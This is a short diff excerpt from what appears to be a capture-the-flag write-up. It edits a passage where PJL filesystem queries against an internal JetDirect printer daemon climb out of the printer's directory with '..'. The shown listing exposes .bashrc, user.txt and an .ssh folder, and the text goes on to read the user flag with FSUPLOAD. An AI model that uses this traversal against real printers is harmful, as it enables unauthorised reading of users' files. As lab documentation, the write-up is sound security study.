@@ -121,11 +121,13 @@ An important safety lesson from the session: write-capable commands were tested 
 logs TYPE=DIR SIZE=4096
 jetdirect.py TYPE=FILE SIZE=5119
 
-@PJL FSQUERY NAME="..\" ENTRY=1 COUNT=20
+@PJL FSQUERY NAME=".." ENTRY=1 COUNT=20
 .bashrc TYPE=FILE SIZE=3771
 user.txt TYPE=FILE SIZE=33
 .ssh TYPE=DIR
 ```
+
+![PJL probing of the internal JetDirect daemon](03-jetdirect-pjl-probe.png)
 
 Then `FSUPLOAD` reads the user flag:
 
